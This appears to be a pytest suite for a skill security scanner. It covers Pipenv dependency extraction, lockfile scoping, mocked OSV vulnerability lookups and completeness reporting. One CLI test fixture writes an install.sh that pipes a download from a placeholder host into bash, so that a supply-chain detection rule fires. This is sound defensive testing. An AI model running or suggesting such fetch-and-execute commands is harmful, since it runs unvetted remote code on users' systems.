# SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
# SPDX-License-Identifier: Apache-2.0

"""Pipenv dependency extraction, coverage, and complete CLI regressions."""

import json
import sys

import pytest
from typer.testing import CliRunner

from skillspector.cli import app
from skillspector.inspection_ledger import LedgerOutcome, LedgerReason
from skillspector.nodes.analyzers import static_patterns_supply_chain as supply_chain
from skillspector.nodes.analyzers.osv_client import QueryBatchResults, VulnResult


@pytest.fixture
def osv_packages(monkeypatch):
    """Isolate extraction from the network and model only the cited affected pin."""
    seen = []

    def query(packages, ecosystem, **_kwargs):
        assert ecosystem == "PyPI"
        seen.extend(packages)
        return QueryBatchResults(
            [
                [
                    VulnResult(
                        vuln_id="PYSEC-2021-142",
                        summary="PyYAML FullLoader processes untrusted input unsafely",
                        severity="HIGH",
                        aliases=("CVE-2020-14343",),
                    )
                ]
                if name.lower() == "pyyaml" and version == "5.3.1"
                else []
                for name, version in packages
            ]
        )

    monkeypatch.setattr(supply_chain, "query_batch", query)
    monkeypatch.setattr(supply_chain, "was_osv_reachable", lambda: True)
    return seen


def _lock_content(**categories):
    return json.dumps(
        {
            "_meta": {
                "pipfile-spec": 6,
                "requires": {"python_version": "3.12"},
                "sources": [{"name": "pypi", "url": "https://pypi.org/simple"}],
            },
            **categories,
        },
        indent=2,
    )


@pytest.fixture
def oversized_pipenv_metadata(filename):
    """Exercise the real parsers under CPython's default integer digit limit."""
    previous_limit = sys.get_int_max_str_digits()
    sys.set_int_max_str_digits(sys.int_info.default_max_str_digits)
    number = "9" * 5000
    content = (
        f"[pipenv]\noversized = {number}\n[packages]\n"
        if filename == "Pipfile"
        else '{"_meta": {"oversized": ' + number + '}, "default": {}}'
    )
    try:
        yield content
    finally:
        sys.set_int_max_str_digits(previous_limit)


@pytest.mark.parametrize("filename", ["Pipfile", "Pipfile.lock"])
def test_oversized_metadata_records_parse_limitation(
    filename, oversized_pipenv_metadata, osv_packages
):
    findings, limitations, count = supply_chain._analyze_dependencies_detailed(
        oversized_pipenv_metadata, filename
    )

    assert not findings
    assert not osv_packages
    assert count == 0
    assert len(limitations) == 1
    assert limitations[0].reason is LedgerReason.DEPENDENCY_PARSE_ERROR
    assert limitations[0].error_class == "ValueError"


@pytest.mark.parametrize("filename", ["Pipfile", "Pipfile.lock"])
def test_cli_oversized_metadata_preserves_other_supply_chain_findings(
    tmp_path, filename, oversized_pipenv_metadata, osv_packages
):
    bundle = tmp_path / "skill"
    bundle.mkdir()
    (bundle / "SKILL.md").write_text(
        "---\nname: dependency-review\n"
        "description: Summarize project dependencies when the user asks for a dependency review.\n"
        "---\n# Dependency Review\nRead the bundled project dependency list.\n"
    )
    (bundle / "install.sh").write_text("curl https://example.invalid/install.sh | bash\n")
    (bundle / "requirements.txt").write_text("pyyaml==5.3.1\n")
    (bundle / filename).write_text(oversized_pipenv_metadata)
    output = tmp_path / "report.json"
    result = CliRunner().invoke(
        app,
        [
            "scan",
            str(bundle),
            "--no-llm",
            "--fail-on-findings",
            "--fail-on-incomplete",
            "--format",
            "json",
            "--output",
            str(output),
        ],
    )
    report = json.loads(output.read_text())

    assert result.exit_code == 1
    assert any(
        issue["id"] == "SC2" and issue["location"]["file"] == "install.sh"
        for issue in report["issues"]
    )
    assert any(
        issue["id"] == "SC4"
        and issue["location"]["file"] == "requirements.txt"
        and "CVE-2020-14343" in issue["pattern"]
        for issue in report["issues"]
    )
    assert ("pyyaml", "5.3.1") in osv_packages
    completeness = report["analysis_completeness"]
    assert not completeness["is_complete"]
    assert any(
        event["path"] == filename
        and event["outcome"] == LedgerOutcome.PARTIAL
        and event["reason_code"] == LedgerReason.DEPENDENCY_PARSE_ERROR
        and event["error_class"] == "ValueError"
        for event in completeness["ledger_exceptions"]
    )
    assert not any(
        event["reason_code"] == LedgerReason.ANALYZER_RUNTIME_ERROR
        for event in completeness["ledger_exceptions"]
    )


def test_pipfile_categories_and_metadata(osv_packages):
    content = """[[source]]
name = "pypi"
url = "https://pypi.org/simple"
verify_ssl = true
[requires]
python_version = "3.12"
[scripts]
review = "echo dependency review"
[pipenv]
allow_prereleases = true
[packages]
pyyaml = "==5.3.1"
requests = {version = ">=2.31", extras = ["socks"], markers = "python_version >= '3.8'"}
[dev-packages]
pytest = "==8.1.1"
[docs]
sphinx = "==7.3.0"
"""
    findings, limitations, count = supply_chain._analyze_dependencies_detailed(content, "Pipfile")

    assert osv_packages == [
        ("pyyaml", "5.3.1"),
        ("requests", None),
        ("pytest", "8.1.1"),
        ("sphinx", "7.3.0"),
    ]
    assert count == 4
    assert not limitations
    finding = next(item for item in findings if item.rule_id == "SC4")
    assert finding.location.start_line == 12
    assert "CVE-2020-14343" in finding.message


def test_lockfile_checks_all_resolved_categories(osv_packages):
    content = _lock_content(
        default={"requests": {"version": "==2.32.4", "hashes": ["sha256:fixture"]}},
        develop={"pytest": {"version": "==8.1.1"}},
        docs={"pyyaml": {"version": "==5.3.1", "index": "pypi"}},
    )
    findings, limitations, count = supply_chain._analyze_dependencies_detailed(
        content, "nested/Pipfile.lock"
    )

    assert osv_packages == [("requests", "2.32.4"), ("pytest", "8.1.1"), ("pyyaml", "5.3.1")]
    assert count == 3
    assert not limitations
    assert any(item.rule_id == "SC4" for item in findings)


def test_lockfile_resolves_unpinned_manifest(osv_packages):
    content = _lock_content(default={"pyyaml": {"version": "==5.3.1"}})
    locked = supply_chain._collect_locked_versions(
        {"Pipfile.lock": content}, ["Pipfile.lock"], file_path="Pipfile"
    )
    findings = supply_chain._analyze_dependencies('[packages]\npyyaml = "*"\n', "Pipfile", locked)

    assert locked == {"pyyaml": "5.3.1"}
    assert osv_packages == [("pyyaml", "5.3.1")]
    assert any(item.rule_id == "SC4" and item.severity == "HIGH" for item in findings)


@pytest.mark.parametrize("with_root_project", [False, True])
def test_cli_pipenv_lock_versions_stay_with_their_project(
    tmp_path, osv_packages, with_root_project
):
    bundle = tmp_path / "skill"
    bundle.mkdir()
    (bundle / "SKILL.md").write_text(
        "---\nname: dependency-review\n"
        "description: Summarize project dependencies when the user asks for a dependency review.\n"
        "---\n# Dependency Review\nRead the bundled project dependency lists.\n"
    )
    files = {
        "requirements.txt": "pyyaml\n",
        "docs/Pipfile": '[packages]\npyyaml = "==5.3.1"\n',
        "docs/Pipfile.lock": _lock_content(default={"pyyaml": {"version": "==5.3.1"}}),
    }
    if with_root_project:
        files["Pipfile"] = '[packages]\npyyaml = "*"\n'
        files["Pipfile.lock"] = _lock_content(default={"pyyaml": {"version": "==6.0.2"}})
    for path, content in files.items():
        target = bundle / path
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(content)
    output = tmp_path / "report.json"
    result = CliRunner().invoke(
        app,
        [
            "scan",
            str(bundle),
            "--no-llm",
            "--fail-on-findings",
            "--fail-on-incomplete",
            "--format",
            "json",
            "--output",
            str(output),
        ],
    )
    report = json.loads(output.read_text())

    assert result.exit_code == 1
    assert ("pyyaml", None) in osv_packages
    if with_root_project:
        assert ("pyyaml", "6.0.2") in osv_packages
    assert ("pyyaml", "5.3.1") in osv_packages
    assert report["analysis_completeness"]["is_complete"]
    sc4_paths = {issue["location"]["file"] for issue in report["issues"] if issue["id"] == "SC4"}
    assert sc4_paths == {"docs/Pipfile", "docs/Pipfile.lock"}


@pytest.mark.parametrize("reverse_order", [False, True])
@pytest.mark.parametrize(
    "manifest_path",
    ["requirements.txt", "docs/requirements.txt", "Pipfile", "examples/Pipfile"],
)
def test_node_does_not_reuse_unrelated_pipenv_lock_versions(
    monkeypatch, osv_packages, manifest_path, reverse_order
):
    monkeypatch.setattr(
        supply_chain.static_runner,
        "run_static_patterns_with_ledger",
        lambda _state, _modules: {
            "findings": [],
            "inspection_ledger": [],
            "analyzer_status_events": [],
        },
    )
    files = {
        manifest_path: (
            '[packages]\npyyaml = "*"\n' if manifest_path.endswith("Pipfile") else "pyyaml\n"
        ),
        "docs/Pipfile": '[packages]\npyyaml = "*"\n',
        "docs/Pipfile.lock": _lock_content(default={"pyyaml": {"version": "==5.3.1"}}),
    }
    components = list(files)
    if reverse_order:
        components.reverse()
    response = supply_chain.node(
        {
            "skill_path": "",
            "components": components,
            "file_cache": files,
            "local_file_cache": files,
            "manifest": {},
            "component_metadata": [],
        }
    )

    assert ("pyyaml", None) in osv_packages
    sc4_paths = {item.file for item in response["findings"] if item.rule_id == "SC4"}
    assert sc4_paths == {"docs/Pipfile", "docs/Pipfile.lock"}


@pytest.mark.parametrize("reverse_order", [False, True])
def test_conflicting_lock_categories_leave_manifest_version_unresolved(osv_packages, reverse_order):
    categories = {
        "default": {"pyyaml": {"version": "==5.3.1"}},
        "develop": {"pyyaml": {"version": "==6.0.2"}},
        "docs": {"pyyaml": {"version": "==5.3.1"}},
    }
    if reverse_order:
        categories = dict(reversed(list(categories.items())))
    content = _lock_content(**categories)
    locked = supply_chain._collect_locked_versions(
        {"docs/Pipfile.lock": content}, ["docs/Pipfile.lock"], file_path="docs/Pipfile"
    )
    findings = supply_chain._analyze_dependencies(
        '[packages]\npyyaml = "*"\n', "docs/Pipfile", locked
    )
    assert not locked
    assert osv_packages == [("pyyaml", None)]
    assert not any(item.rule_id == "SC4" for item in findings)

    supply_chain._analyze_dependencies(content, "docs/Pipfile.lock")
    assert ("pyyaml", "5.3.1") in osv_packages
    assert ("pyyaml", "6.0.2") in osv_packages


@pytest.mark.parametrize("lock_name", ["uv.lock", "poetry.lock"])
@pytest.mark.parametrize(
    ("manifest_path", "expected_version"),
    [
        ("docs/requirements.txt", "5.3.1"),
        ("docs/pyproject.toml", "5.3.1"),
        ("requirements.txt", None),
        ("examples/pyproject.toml", None),
        ("docs/Pipfile", None),
    ],
)
def test_python_lock_versions_follow_directory_and_manifest_type(
    lock_name, manifest_path, expected_version
):
    lock_path = f"docs/{lock_name}"
    content = '[[package]]\nname = "pyyaml"\nversion = "5.3.1"\n'
    locked = supply_chain._collect_locked_versions(
        {lock_path: content}, [lock_path], file_path=manifest_path
    )
    assert locked.get("pyyaml") == expected_version


def test_project_scoping_keeps_the_aggregate_lock_package_budget():
    files = {
        "Pipfile.lock": _lock_content(default={"first": {"version": "==1.0"}}),
        "docs/Pipfile.lock": _lock_content(default={"second": {"version": "==2.0"}}),
    }
    locked, limitations = supply_chain._collect_locked_versions_detailed(
        files, list(files), limit=1
    )
    assert sum(len(versions) for versions in locked.values()) == 1
    assert any(
        path == "docs/Pipfile.lock" and limitation.reason is LedgerReason.OUTPUT_LIMIT
        for path, limitation in limitations
    )


@pytest.mark.parametrize("reverse_order", [False, True])
@pytest.mark.parametrize("limitation_kind", ["git", "syntax", "size", "entry_limit"])
def test_file_local_lock_limitations_preserve_other_projects(limitation_kind, reverse_order):
    git_entry = {"git": "https://example.invalid/dependency.git"}
    contents = {
        "git": _lock_content(default={"custom": git_entry}),
        "syntax": "{",
        "size": _lock_content(
            default={"x" * (supply_chain.MAX_DEPENDENCY_NAME_CHARS + 1): {"version": "==1.0"}}
        ),
        "entry_limit": _lock_content(default={f"custom{i}": git_entry for i in range(4)}),
    }
    files = {
        "Pipfile.lock": contents[limitation_kind],
        "docs/Pipfile.lock": _lock_content(default={"pyyaml": {"version": "==5.3.1"}}),
    }
    components = list(files)
    if reverse_order:
        components.reverse()
    locked, limitations = supply_chain._collect_locked_versions_detailed(files, components, limit=2)

    assert locked[supply_chain._python_lock_scope("docs/Pipfile")] == {"pyyaml": "5.3.1"}
    expected_reason = {
        "git": LedgerReason.DEPENDENCY_PARSE_ERROR,
        "syntax": LedgerReason.DEPENDENCY_PARSE_ERROR,
        "size": LedgerReason.SIZE_LIMIT,
        "entry_limit": LedgerReason.OUTPUT_LIMIT,
    }[limitation_kind]
    assert any(
        path == "Pipfile.lock" and limitation.reason is expected_reason
        for path, limitation in limitations
    )


@pytest.mark.parametrize("reverse_order", [False, True])
def test_node_unsupported_lock_source_preserves_other_manifest_findings(
    monkeypatch, osv_packages, reverse_order
):
    monkeypatch.setattr(
        supply_chain.static_runner,
        "run_static_patterns_with_ledger",
        lambda _state, _modules: {
            "findings": [],
            "inspection_ledger": [],
            "analyzer_status_events": [],
        },
    )
    files = {
        "Pipfile.lock": _lock_content(
            default={"custom": {"git": "https://example.invalid/dependency.git"}}
        ),
        "docs/Pipfile.lock": _lock_content(default={"pyyaml": {"version": "==5.3.1"}}),
        "docs/Pipfile": '[packages]\npyyaml = "*"\n',
    }
    components = list(files)
    if reverse_order:
        components.reverse()
    response = supply_chain.node(
        {
            "skill_path": "",
            "components": components,
            "file_cache": files,
            "local_file_cache": files,
            "manifest": {},
            "component_metadata": [],
        }
    )

    sc4_paths = {item.file for item in response["findings"] if item.rule_id == "SC4"}
    assert sc4_paths == {"docs/Pipfile", "docs/Pipfile.lock"}
    assert ("pyyaml", None) not in osv_packages
    assert any(
        event["path"] == "Pipfile.lock"
        and event["outcome"] is LedgerOutcome.PARTIAL
        and event["reason_code"] is LedgerReason.DEPENDENCY_PARSE_ERROR
        and event["error_class"] == "UnsupportedDependencySource"
        for event in response["inspection_ledger"]
    )


@pytest.mark.parametrize("spec", ["*", ">=5.3", "~=5.3", "==5.3.*"])
def test_manifest_ranges_are_not_treated_as_installed_versions(spec, osv_packages):
    findings = supply_chain._analyze_dependencies(f'[packages]\npyyaml = "{spec}"\n', "Pipfile")

    assert osv_packages == [("pyyaml", None)]
    assert not any(item.rule_id == "SC4" and item.severity == "HIGH" for item in findings)


@pytest.mark.parametrize("version", ["5.3.1rc1", "5.3.1.post1", "1!5.3.1"])
@pytest.mark.parametrize("filename", ["Pipfile", "Pipfile.lock"])
def test_exact_pep440_versions_are_preserved(version, filename, osv_packages):
    content = (
        f'[packages]\nexample = "=={version}"\n'
        if filename == "Pipfile"
        else _lock_content(default={"example": {"version": f"=={version}"}})
    )
    supply_chain._analyze_dependencies(content, filename)
    assert osv_packages == [("example", version)]


@pytest.mark.parametrize("filename", ["Pipfile", "Pipfile.lock"])
def test_locations_are_specific_to_each_category(filename, osv_packages):
    content = (
        '[scripts]\nexample = "echo hello"\n[packages]\nexample = "==1.0"\n'
        '[dev-packages]\nexample = "==2.0"\n'
        if filename == "Pipfile"
        else _lock_content(
            default={"example": {"version": "==1.0"}},
            develop={"example": {"version": "==2.0"}},
        )
    )
    packages, limitations = supply_chain._extract_packages_from_pipenv(
        content, is_lockfile=filename == "Pipfile.lock"
    )

    assert not limitations
    assert [item[:2] for item in packages] == [("example", "1.0"), ("example", "2.0")]
    assert packages[0][2] != packages[1][2]
    for _name, _version, line in packages:
        assert "example" in content.splitlines()[line - 1]


def test_quoted_keys_and_expanded_package_tables(osv_packages):
    content = '["packages"."pyyaml"]\nversion = "==5.3.1"\n'
    packages, limitations = supply_chain._extract_packages_from_pipenv(content, is_lockfile=False)
    assert packages == [("pyyaml", "5.3.1", 1)]
    assert not limitations


@pytest.mark.parametrize("quote", ['"""', "'''"])
def test_multiline_metadata_cannot_supply_a_dependency_location(quote):
    content = (
        '[packages]\npyyaml = "==5.3.1"\n[scripts]\n'
        f"review = [{quote}\n[packages]\npyyaml = 'inert text'\n{quote}]\n"
    )
    packages, limitations = supply_chain._extract_packages_from_pipenv(content, is_lockfile=False)
    assert packages == [("pyyaml", "5.3.1", 2)]
    assert not limitations


def test_escaped_multiline_delimiter_does_not_end_metadata():
    content = (
        '[packages]\npyyaml = "==5.3.1"\n[scripts]\nreview = """\n'
        '\\"""\n[packages]\npyyaml = "inert text"\n"""\n'
    )
    packages, limitations = supply_chain._extract_packages_from_pipenv(content, is_lockfile=False)
    assert packages == [("pyyaml", "5.3.1", 2)]
    assert not limitations


@pytest.mark.parametrize(
    ("filename", "content"),
    [
        ("Pipfile", "[packages\npyyaml ="),
        ("Pipfile", "packages = 42\n"),
        ("Pipfile", "[packages]\npyyaml = false\n"),
        ("Pipfile.lock", "{"),
        ("Pipfile.lock", ""),
        ("Pipfile.lock", "[]"),
        ("Pipfile.lock", '{"default": []}'),
        ("Pipfile.lock", '{"default": {"pyyaml": "==5.3.1"}}'),
        ("Pipfile.lock", '{"default": {"pyyaml": {"version": ">=5.3"}}}'),
    ],
)
def test_malformed_dependency_metadata_is_partial(filename, content, osv_packages):
    _findings, limitations, count = supply_chain._analyze_dependencies_detailed(content, filename)
    assert count == 0
    assert not osv_packages
    assert any(item.reason is LedgerReason.DEPENDENCY_PARSE_ERROR for item in limitations)


@pytest.mark.parametrize("filename", ["Pipfile", "Pipfile.lock"])
def test_non_registry_sources_are_not_queried_as_pypi(filename, osv_packages):
    source = {"git": "https://example.invalid/repository.git", "version": "==5.3.1"}
    content = (
        '[packages]\npyyaml = {git = "https://example.invalid/repository.git", version = "==5.3.1"}\n'
        if filename == "Pipfile"
        else _lock_content(default={"pyyaml": source})
    )
    _findings, limitations, count = supply_chain._analyze_dependencies_detailed(content, filename)
    assert not osv_packages
    assert count == 0
    assert any(item.error_class == "UnsupportedDependencySource" for item in limitations)


@pytest.mark.parametrize("filename", ["Pipfile", "Pipfile.lock"])
def test_package_limit_retains_partial_coverage(filename, osv_packages):
    content = (
        '[packages]\none = "==1.0"\ntwo = "==2.0"\n'
        if filename == "Pipfile"
        else _lock_content(default={"one": {"version": "==1.0"}, "two": {"version": "==2.0"}})
    )
    _findings, limitations, count = supply_chain._analyze_dependencies_detailed(
        content, filename, max_packages=1
    )
    assert count == 1
    assert osv_packages == [("one", "1.0")]
    assert any(item.reason is LedgerReason.OUTPUT_LIMIT for item in limitations)


def test_invalid_entries_cannot_bypass_the_extraction_limit(osv_packages):
    content = _lock_content(default={f"package-{index}": False for index in range(20)})
    _findings, limitations, count = supply_chain._analyze_dependencies_detailed(
        content, "Pipfile.lock", max_packages=1
    )
    assert count == 0
    assert not osv_packages
    assert any(item.reason is LedgerReason.OUTPUT_LIMIT for item in limitations)


def test_repeated_malformed_categories_keep_diagnostics_bounded():
    content = json.dumps({f"category-{index}": False for index in range(100)})
    packages, limitations = supply_chain._extract_packages_from_pipenv(content, is_lockfile=True)
    assert not packages
    assert len(limitations) == 1
    assert limitations[0].reason is LedgerReason.DEPENDENCY_PARSE_ERROR


def test_oversized_specifier_is_omitted_with_size_accounting(osv_packages):
    content = '[packages]\nexample = "==' + "1" * supply_chain.MAX_DEPENDENCY_SPEC_CHARS + '"\n'
    _findings, limitations, count = supply_chain._analyze_dependencies_detailed(content, "Pipfile")
    assert count == 0
    assert not osv_packages
    assert any(item.reason is LedgerReason.SIZE_LIMIT for item in limitations)


def test_malformed_lockfile_collector_retains_limitation():
    versions, limitations = supply_chain._collect_locked_versions_detailed(
        {"Pipfile.lock": ""}, ["Pipfile.lock"]
    )
    assert not versions
    assert any(
        path == "Pipfile.lock" and item.reason is LedgerReason.DEPENDENCY_PARSE_ERROR
        for path, item in limitations
    )


@pytest.mark.parametrize("filename", ["Pipfile", "Pipfile.lock"])
@pytest.mark.parametrize("version", ["5.3.1", "6.0.2"])
def test_cli_checks_pipenv_dependencies(tmp_path, filename, version, osv_packages):
    bundle = tmp_path / "skill"
    bundle.mkdir()
    (bundle / "SKILL.md").write_text(
        "---\nname: dependency-review\n"
        "description: Summarize project dependencies when the user asks for a dependency review.\n"
        "---\n# Dependency Review\nRead the bundled project dependency list.\n"
    )
    content = (
        f'[packages]\npyyaml = "=={version}"\n'
        if filename == "Pipfile"
        # The lock-only fixture models a transitive dependency without a
        # matching manifest entry. Its coordinates must still be inspected.
        else _lock_content(default={"pyyaml": {"version": f"=={version}"}})
    )
    (bundle / filename).write_text(content)
    output = tmp_path / "report.json"
    result = CliRunner().invoke(
        app,
        [
            "scan",
            str(bundle),
            "--no-llm",
            "--fail-on-findings",
            "--fail-on-incomplete",
            "--format",
            "json",
            "--output",
            str(output),
        ],
    )
    report = json.loads(output.read_text())

    assert ("pyyaml", version) in osv_packages
    assert report["analysis_completeness"]["is_complete"]
    sc4 = [item for item in report["issues"] if item["id"] == "SC4"]
    if version == "5.3.1":
        assert result.exit_code == 1
        assert len(sc4) == 1
        assert "CVE-2020-14343" in sc4[0]["pattern"]
        assert sc4[0]["location"]["file"] == filename
    else:
        assert result.exit_code == 0
        assert not sc4


@pytest.mark.parametrize("filename", ["Pipfile", "Pipfile.lock"])
def test_cli_malformed_pipenv_files_cannot_look_complete(tmp_path, filename, osv_packages):
    bundle = tmp_path / "skill"
    bundle.mkdir()
    (bundle / "SKILL.md").write_text("---\nname: review\n---\n# Review\n")
    (bundle / filename).write_text("[packages" if filename == "Pipfile" else "")
    output = tmp_path / "report.json"
    result = CliRunner().invoke(
        app,
        [
            "scan",
            str(bundle),
            "--no-llm",
            "--fail-on-incomplete",
            "--format",
            "json",
            "--output",
            str(output),
        ],
    )
    report = json.loads(output.read_text())

    assert result.exit_code == 1
    assert not report["analysis_completeness"]["is_complete"]
    assert report["risk_assessment"]["recommendation"] != "SAFE"
    assert any(
        event["outcome"] == LedgerOutcome.PARTIAL
        and event["reason_code"] == LedgerReason.DEPENDENCY_PARSE_ERROR
        for event in report["analysis_completeness"]["ledger_exceptions"]
    )
